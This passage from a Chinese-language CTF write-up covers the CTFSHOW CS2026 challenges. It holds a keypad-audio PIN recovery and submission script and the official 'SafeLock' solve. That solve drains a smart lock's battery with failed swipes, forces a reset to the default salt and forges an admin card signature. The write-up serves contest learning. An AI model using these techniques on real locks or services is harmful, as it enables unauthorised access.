class="built_in">max</span>(np.<span class="built_in">abs</span>(clip)) + <span class="number">1e-12</span>)</span><br><span class="line">    max_shift = <span class="built_in">int</span>(<span class="number">0.012</span> * SR)</span><br><span class="line"></span><br><span class="line">    best, best_sc = -<span class="number">1</span>, -<span class="number">1e9</span></span><br><span class="line">    <span class="keyword">for</span> sid, tmpl <span class="keyword">in</span> templates.items():</span><br><span class="line">        t = tmpl - tmpl.mean()</span><br><span class="line">        t = t / (np.<span class="built_in">max</span>(np.<span class="built_in">abs</span>(t)) + <span class="number">1e-12</span>)</span><br><span class="line"></span><br><span class="line">        a = clip.astype(np.float32)</span><br><span class="line">        b = t.astype(np.float32)</span><br><span class="line">        a = a / (np.linalg.norm(a) + <span class="number">1e-12</span>)</span><br><span class="line">        b = b / (np.linalg.norm(b) + <span class="number">1e-12</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> a.size &lt; b.size:</span><br><span class="line">            short, long = a, b</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            short, long = b, a</span><br><span class="line"></span><br><span class="line">        m = short.size</span><br><span class="line">        n = long.size</span><br><span class="line">        <span class="keyword">if</span> n == m:</span><br><span class="line">            sc = <span class="built_in">float</span>(np.dot(short, long))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            center = (n - m) // <span class="number">2</span></span><br><span class="line">            st = <span class="built_in">max</span>(<span class="number">0</span>, center - max_shift)</span><br><span class="line">            ed = <span class="built_in">min</span>(n - m, center + max_shift)</span><br><span class="line">            sc = -<span class="number">1.0</span></span><br><span class="line">            <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(st, ed + <span class="number">1</span>):</span><br><span class="line">                v = <span class="built_in">float</span>(np.dot(short, long[off:off + m]))</span><br><span class="line">                <span class="keyword">if</span> v &gt; sc:</span><br><span class="line">                    sc = v</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sc &gt; best_sc:</span><br><span class="line">            best_sc, best = sc, sid</span><br><span class="line">    <span class="keyword">return</span> best</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_attempts</span>(<span class="params">ids: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    attempts: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]] = []</span><br><span class="line">    cur: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">flush</span>():</span><br><span class="line">        <span class="keyword">if</span> cur:</span><br><span class="line">            attempts.append(cur[:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> sid <span class="keyword">in</span> ids:</span><br><span class="line">        <span class="keyword">if</span> sid == SOUND_CANCEL:</span><br><span class="line">            flush()</span><br><span class="line">            cur.clear()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> sid == SOUND_ENTER:</span><br><span class="line">            flush()</span><br><span class="line">            cur.clear()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= sid &lt;= <span class="number">9</span>:</span><br><span class="line">            cur.append(sid)</span><br><span class="line"></span><br><span class="line">    flush()</span><br><span class="line">    attempts = [a <span class="keyword">for</span> a <span class="keyword">in</span> attempts <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt;= <span class="number">4</span>]  </span><br><span class="line">    <span class="keyword">return</span> attempts</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pick6</span>(<span class="params">digits: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> digits)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> s[:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_two_pins</span>(<span class="params">seed: <span class="built_in">str</span>, wav_path: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    x = read_wav_mono(wav_path)</span><br><span class="line">    env = rms_env(x, win=<span class="built_in">int</span>(<span class="number">0.004</span> * SR))</span><br><span class="line">    segs = segment(env)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> segs:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no segments&quot;</span>)</span><br><span class="line"></span><br><span class="line">    templates = &#123;sid: gen_key_sound(seed, sid) <span class="keyword">for</span> sid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)&#125;</span><br><span class="line">    ids = [best_sid(seed, x[s:e], templates) <span class="keyword">for</span> s, e <span class="keyword">in</span> segs]</span><br><span class="line"></span><br><span class="line">    raw_attempts = decode_attempts(ids)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_attempts:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no attempts ids=<span class="subst">&#123;ids&#125;</span>&quot;</span>)</span><br><span class="line">    raw = <span class="built_in">max</span>(raw_attempts, key=<span class="built_in">len</span>)</span><br><span class="line"></span><br><span class="line">    a = permute_0_9(seed)</span><br><span class="line"></span><br><span class="line">    sid2d = &#123;a[d]: d <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;</span><br><span class="line">    d1 = [sid2d.get(sid, <span class="number">0</span>) <span class="keyword">for</span> sid <span class="keyword">in</span> raw]</span><br><span class="line">    pin1 = pick6(d1)</span><br><span class="line"></span><br><span class="line">    d2 = [a[sid] <span class="keyword">for</span> sid <span class="keyword">in</span> raw <span class="keyword">if</span> <span class="number">0</span> &lt;= sid &lt;= <span class="number">9</span>]</span><br><span class="line">    pin2 = pick6(d2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pin1, pin2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">s: requests.Session, base: <span class="built_in">str</span>, pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        r = s.post(base + <span class="string">&quot;/check.php&quot;</span>, json=&#123;<span class="string">&quot;pin&quot;</span>: pin&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            j = r.json()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            j = &#123;<span class="string">&quot;ok&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">429</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: r.status_code, <span class="string">&quot;json&quot;</span>: j&#125;</span><br><span class="line">        ra = <span class="built_in">int</span>(j.get(<span class="string">&quot;retry_after&quot;</span>) <span class="keyword">or</span> j.get(<span class="string">&quot;cd&quot;</span>) <span class="keyword">or</span> <span class="number">1</span>)</span><br><span class="line">        time.sleep(<span class="built_in">max</span>(<span class="number">1</span>, ra))</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="number">429</span>, <span class="string">&quot;json&quot;</span>: &#123;<span class="string">&quot;ok&quot;</span>: <span class="literal">False</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python exp.py &lt;base_url&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    base = sys.argv[<span class="number">1</span>].rstrip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    j = s.get(base + <span class="string">&quot;/seed.php&quot;</span>, timeout=<span class="number">10</span>).json()</span><br><span class="line">    seed = <span class="built_in">str</span>(j[<span class="string">&quot;seed&quot;</span>])</span><br><span class="line">    rec_url = j[<span class="string">&quot;record_url&quot;</span>]</span><br><span class="line">    full = rec_url <span class="keyword">if</span> rec_url.startswith(<span class="string">&quot;http&quot;</span>) <span class="keyword">else</span> base + rec_url</span><br><span class="line"></span><br><span class="line">    wav = s.get(full, timeout=<span class="number">20</span>).content</span><br><span class="line">    path = <span class="string">&quot;record.wav&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(wav)</span><br><span class="line"></span><br><span class="line">    pin1, pin2 = solve_two_pins(seed, path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] seed =&quot;</span>, seed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] PIN1 =&quot;</span>, pin1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] PIN2 =&quot;</span>, pin2)</span><br><span class="line"></span><br><span class="line">    r1 = submit(s, base, pin1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] submit PIN1:&quot;</span>, r1)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(r1.get(<span class="string">&quot;json&quot;</span>), <span class="built_in">dict</span>) <span class="keyword">and</span> r1[<span class="string">&quot;json&quot;</span>].get(<span class="string">&quot;ok&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] FLAG:&quot;</span>, r1[<span class="string">&quot;json&quot;</span>].get(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    r2 = submit(s, base, pin2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] submit PIN2:&quot;</span>, r2)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(r2.get(<span class="string">&quot;json&quot;</span>), <span class="built_in">dict</span>) <span class="keyword">and</span> r2[<span class="string">&quot;json&quot;</span>].get(<span class="string">&quot;ok&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] FLAG:&quot;</span>, r2[<span class="string">&quot;json&quot;</span>].get(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<ul>
<li>。。。真没招了我是菜狗<br>
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-3.png" alt="alt text"></li>
</ul>
<h1>SafeLock</h1>
<p>分类：CTF部分 | 分值：200</p>
<p>题目描述<br>
绝对安全的智能锁，没有卡片开不了的</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-6.png" alt="alt text"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-5.png" alt="alt text"></p>
<blockquote>
<ul>
<li>BOOT 锁联网上线</li>
<li>开始初始化</li>
<li>使用出厂密钥和默认salt为123456 设置管理员卡</li>
<li>使用一次后就过期</li>
<li>SALT更新为随机8位数字</li>
<li>主要攻击线路：
<ul>
<li>拉闸-&gt;迫使锁用电池-&gt;每次验证掉5%的电-&gt;电池掉光电-&gt;锁完全进入离线状态-&gt;恢复供电-&gt;开始初始化salt为123456-&gt;给自己刷管理员卡-&gt;开门禁系统</li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">CTFSHOW CS2026 - NFC Smart Lock (Official Full Auto Solve)</span></span><br><span class="line"><span class="string">Author: h1xa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Full flow (stable):</span></span><br><span class="line"><span class="string">1) GET  /api/challenge -&gt; nonce</span></span><br><span class="line"><span class="string">2) POST /api/power mains_on=false  (cut mains, switch to battery)</span></span><br><span class="line"><span class="string">3) POST /api/verify wrong card 20 times (drain battery to 0, device offline)</span></span><br><span class="line"><span class="string">4) POST /api/power mains_on=true   (restore mains, triggers FACTORY_RESET_OK, nonce rotates)</span></span><br><span class="line"><span class="string">5) GET  /api/challenge -&gt; new nonce</span></span><br><span class="line"><span class="string">6) Compute correct sig with salt=123456 and POST /api/verify -&gt; print flag</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span>, <span class="type">Dict</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> certifi</span><br><span class="line"></span><br><span class="line">DEVICE_ID = <span class="string">&quot;LOCK-X36D&quot;</span></span><br><span class="line">FACTORY_SALT = <span class="string">&quot;123456&quot;</span></span><br><span class="line">ROLE = <span class="string">&quot;admin&quot;</span></span><br><span class="line">DRAIN_PER_SWIPE = <span class="number">5</span></span><br><span class="line">DRAIN_TIMES = <span class="number">100</span> // DRAIN_PER_SWIPE  <span class="comment"># 20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc16_ccitt_false</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    crc = <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc ^= (b &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> crc &amp; <span class="number">0x8000</span>:</span><br><span class="line">                crc = ((crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1021</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                crc = (crc &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">return</span> crc &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_sig</span>(<span class="params">device_id: <span class="built_in">str</span>, nonce: <span class="built_in">str</span>, salt: <span class="built_in">str</span>, role: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    msg = <span class="string">f&quot;<span class="subst">&#123;device_id&#125;</span>|<span class="subst">&#123;nonce&#125;</span>|<span class="subst">&#123;salt&#125;</span>|<span class="subst">&#123;role&#125;</span>&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;crc16_ccitt_false(msg):04X&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_no_proxy</span>() -&gt; requests.Session:</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.trust_env = <span class="literal">False</span></span><br><span class="line">    s.proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    s.verify = <span class="literal">False</span> <span class="comment"># 我加的用来避免证书问题</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_json</span>(<span class="params">s: requests.Session, url: <span class="built_in">str</span>, **kw</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    r = s.get(url, timeout=<span class="number">10</span>, **kw)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_json</span>(<span class="params">s: requests.Session, url: <span class="built_in">str</span>, payload: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    r = s.post(url, json=payload, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = r.json()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Bad JSON response (HTTP <span class="subst">&#123;r.status_code&#125;</span>): <span class="subst">&#123;r.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data, r.status_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_challenge</span>(<span class="params">base: <span class="built_in">str</span>, s: requests.Session</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="keyword">return</span> get_json(s, base.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/api/challenge&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_power</span>(<span class="params">base: <span class="built_in">str</span>, s: requests.Session, mains_on: <span class="built_in">bool</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    data, code = post_json(s, base.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/api/power&quot;</span>, &#123;<span class="string">&quot;mains_on&quot;</span>: mains_on&#125;)</span><br><span class="line">    <span class="keyword">if</span> code &gt;= <span class="number">400</span> <span class="keyword">or</span> <span class="keyword">not</span> data.get(<span class="string">&quot;ok&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;/api/power failed: HTTP <span class="subst">&#123;code&#125;</span>, body=<span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_verify</span>(<span class="params">base: <span class="built_in">str</span>, s: requests.Session, card_payload: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>], lock_nonce: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    data, code = post_json(</span><br><span class="line">        s,</span><br><span class="line">        base.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/api/verify&quot;</span>,</span><br><span class="line">        &#123;<span class="string">&quot;card_payload&quot;</span>: card_payload, <span class="string">&quot;lock_nonce&quot;</span>: lock_nonce&#125;,</span><br><span class="line">    )</span><br><span class="line">    data[<span class="string">&quot;_http&quot;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pick_nonce</span>(<span class="params">ch: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    st = ch.get(<span class="string">&quot;state&quot;</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    nonce = st.get(<span class="string">&quot;nonce&quot;</span>) <span class="keyword">or</span> ch.get(<span class="string">&quot;nonce&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nonce:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;nonce missing in /api/challenge response&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(nonce)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    ap = argparse.ArgumentParser(description=<span class="string">&quot;CTFSHOW NFC smart lock full auto solve&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--base&quot;</span>, default=<span class="string">&quot;http://127.0.0.1:5000&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Challenge base URL&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--sleep&quot;</span>, <span class="built_in">type</span>=<span class="built_in">float</span>, default=<span class="number">0.0</span>, <span class="built_in">help</span>=<span class="string">&quot;sleep between drain swipes (seconds)&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--verbose&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;print progress and server events&quot;</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">    s = session_no_proxy()</span><br><span class="line">    base = args.base</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">vprint</span>(<span class="params">*a</span>):</span><br><span class="line">        <span class="keyword">if</span> args.verbose:</span><br><span class="line">            <span class="built_in">print</span>(*a, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    ch1 = api_challenge(base, s)</span><br><span class="line">    nonce1 = pick_nonce(ch1)</span><br><span class="line">    vprint(<span class="string">f&quot;[*] nonce (initial): <span class="subst">&#123;nonce1&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p1 = api_power(base, s, mains_on=<span class="literal">False</span>)</span><br><span class="line">    vprint(<span class="string">&quot;[*] power off events:&quot;</span>, p1.get(<span class="string">&quot;events&quot;</span>, []))</span><br><span class="line">    st = p1.get(<span class="string">&quot;state&quot;</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    vprint(<span class="string">f&quot;[*] state after power off: mains_on=<span class="subst">&#123;st.get(<span class="string">&#x27;mains_on&#x27;</span>)&#125;</span> battery=<span class="subst">&#123;st.get(<span class="string">&#x27;battery&#x27;</span>)&#125;</span> powered=<span class="subst">&#123;st.get(<span class="string">&#x27;powered&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    wrong_card = &#123;</span><br><span class="line">        <span class="string">&quot;device_id&quot;</span>: DEVICE_ID,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce1,   </span><br><span class="line">        <span class="string">&quot;sig&quot;</span>: <span class="string">&quot;0000&quot;</span>,    </span><br><span class="line">        <span class="string">&quot;role&quot;</span>: ROLE</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offline_reached = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, DRAIN_TIMES + <span class="number">1</span>):</span><br><span class="line">        res = api_verify(base, s, wrong_card, lock_nonce=nonce1)</span><br><span class="line"></span><br><span class="line">        st = res.get(<span class="string">&quot;state&quot;</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        reason = res.get(<span class="string">&quot;reason&quot;</span>)</span><br><span class="line">        events = res.get(<span class="string">&quot;events&quot;</span>, [])</span><br><span class="line">        vprint(<span class="string">f&quot;[*] drain <span class="subst">&#123;i:02d&#125;</span>/<span class="subst">&#123;DRAIN_TIMES&#125;</span>: http=<span class="subst">&#123;res.get(<span class="string">&#x27;_http&#x27;</span>)&#125;</span> battery=<span class="subst">&#123;st.get(<span class="string">&#x27;battery&#x27;</span>)&#125;</span> powered=<span class="subst">&#123;st.get(<span class="string">&#x27;powered&#x27;</span>)&#125;</span> reason=<span class="subst">&#123;reason&#125;</span> events=<span class="subst">&#123;events&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> reason == <span class="string">&quot;OFFLINE&quot;</span> <span class="keyword">or</span> st.get(<span class="string">&quot;powered&quot;</span>) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            offline_reached = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> args.sleep &gt; <span class="number">0</span>:</span><br><span class="line">            time.sleep(args.sleep)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> offline_reached:</span><br><span class="line">        vprint(<span class="string">&quot;[!] battery drain loop finished but device not offline yet; continuing anyway...&quot;</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    p2 = api_power(base, s, mains_on=<span class="literal">True</span>)</span><br><span class="line">    vprint(<span class="string">&quot;[*] power on events:&quot;</span>, p2.get(<span class="string">&quot;events&quot;</span>, []))</span><br><span class="line">    st2 = p2.get(<span class="string">&quot;state&quot;</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    vprint(<span class="string">f&quot;[*] state after power on: mains_on=<span class="subst">&#123;st2.get(<span class="string">&#x27;mains_on&#x27;</span>)&#125;</span> battery=<span class="subst">&#123;st2.get(<span class="string">&#x27;battery&#x27;</span>)&#125;</span> powered=<span class="subst">&#123;st2.get(<span class="string">&#x27;powered&#x27;</span>)&#125;</span> factory_mode=<span class="subst">&#123;st2.get(<span class="string">&#x27;factory_mode&#x27;</span>)&#125;</span> nonce=<span class="subst">&#123;st2.get(<span class="string">&#x27;nonce&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    ch2 = api_challenge(base, s)</span><br><span class="line">    nonce2 = pick_nonce(ch2)</span><br><span class="line">    vprint(<span class="string">f&quot;[*] nonce (after reset): <span class="subst">&#123;nonce2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    sig = calc_sig(DEVICE_ID, nonce2, FACTORY_SALT, ROLE)</span><br><span class="line">    card = &#123;<span class="string">&quot;device_id&quot;</span>: DEVICE_ID, <span class="string">&quot;nonce&quot;</span>: nonce2, <span class="string">&quot;sig&quot;</span>: sig, <span class="string">&quot;role&quot;</span>: ROLE&#125;</span><br><span class="line">    vprint(<span class="string">&quot;[*] computed sig:&quot;</span>, sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    final = api_verify(base, s, card, lock_nonce=nonce2)</span><br><span class="line">    <span class="keyword">if</span> final.get(<span class="string">&quot;ok&quot;</span>) <span class="keyword">and</span> final.get(<span class="string">&quot;flag&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(final[<span class="string">&quot;flag&quot;</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] unlock failed: <span class="subst">&#123;final&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-7.png" alt="alt text"></p>
<ul>
<li>看不懂啊抓包抓了半天也看不懂怎么分析的。。。</li>
</ul>
<h1>SafePassword</h1>
<p>分类：CTF部分 | 分值：100</p>
<p>题目描述</p>
<ol>
<li>根据情报，J国近年来对我国进行了持续的渗透攻击，我方技术人员经过溯源，发现某个可疑网址。 2. 该网址疑似为J国的情报组织任务分配中心，但是我方并没有拿到登陆口令，无法继续深入。 3. 已经确认嫌疑账号用户名为jcenter，此人2025年加入该组织，登陆口令未知。</li>
</ol>
